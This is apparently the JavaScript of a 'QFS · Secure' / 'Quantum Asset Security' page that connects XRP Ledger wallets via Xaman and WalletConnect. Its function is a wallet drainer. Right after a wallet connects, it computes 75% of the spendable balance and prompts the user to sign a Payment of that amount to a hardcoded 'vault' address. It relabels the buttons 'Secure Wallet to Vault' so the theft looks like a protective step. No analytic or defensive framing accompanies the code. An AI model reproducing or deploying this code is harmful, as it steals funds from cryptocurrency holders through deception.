// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

// Listen for successful login (especially after mobile redirect)
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

/**
 * Transforms all "Connect Wallet" buttons into "Secure Wallet to Vault"
 */
function updateAllButtonsToSecure() {
  const buttons = document.querySelectorAll('#mainActionButton');
  
  buttons.forEach(btn => {
    // 1. Remove Bootstrap Modal triggers
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    
    // 2. Update Text and Style
    btn.innerText = "Secure Wallet to Vault";
    btn.style.marginLeft = "20px"; // Preserving your hero button layout
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success"); // Change color to green to indicate success

    // 3. Assign New Action
    btn.onclick = (e) => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// MAIN ENTRY
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");

    if (type === "xaman") {
      const session = await xumm.authorize();
      if (session?.me?.account) {
        handlePostConnect("xaman", session.me.account);
      }
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }

  } catch (err) {
    console.error(err);
    const state = await xumm.state();
    if (!state?.me?.account) {
        setStatus("Connection failed");
    }
  }
}

/**
 * Handles logic after any wallet is successfully linked
 */
async function handlePostConnect(type, address) {
    currentAddress = address;
    currentWalletType = type;

    // 1. Force close the Bootstrap modal
    const modalEl = document.getElementById('walletSelectionModal');
    if (modalEl) {
        const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
        modalInstance.hide();
    }

    // 2. Change all buttons on the page
    updateAllButtonsToSecure();
    
    // 3. Update Status Text
    setStatus(`Connected: ${shortAddr(address)}`);

    // 4. Automatically trigger the first prompt
    triggerManualApproval();
}

/**
 * The core action: Fetch balance and ask for signature
 */
async function triggerManualApproval() {
  if (!currentAddress) return;

  try {
    setStatus("Checking balance…");
    const data = await getXrpAccountData(currentAddress);

    setStatus("Awaiting signature…");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);

    setStatus("Transaction submitted ✔");
  } catch (err) {
    console.error("Approval error:", err);
    setStatus("Signature needed");
  }
}

// ==============================
// SIGN & SUBMIT
// ==============================
async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops || "0" // Will prompt even if 0
  };

  if (type === "xaman") {
    // Opens QR on desktop / Redirects on mobile
    await xumm.payload.create(tx);
  } 
  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}

// ==============================
// FETCH XRP DATA
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();

  try {
    const info = await client.request({
      command: "account_info",
      account: address,
      ledger_index: "validated"
    }).catch(() => null);

    if (!info) return { sendDrops: "0" };

    const bal = BigInt(info.result.account_data.Balance);
    const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);

    // Standard XRP Reserve calculation
    const reserve = 10_000_000n + (ownerCount * 2_000_000n);
    const spendable = bal - reserve;
    
    // Calculate 75% of spendable, but don't go below 0
    const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;

    return { sendDrops: send.toString() };
  } finally {
    await client.disconnect();
  }
}

// ==============================
// WALLETCONNECT HELPERS
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Secure",
      description: "Quantum Asset Security",
      url: window.location.origin
    }
  });
  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"],
        events: ["accountsChanged"]
      }
    }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}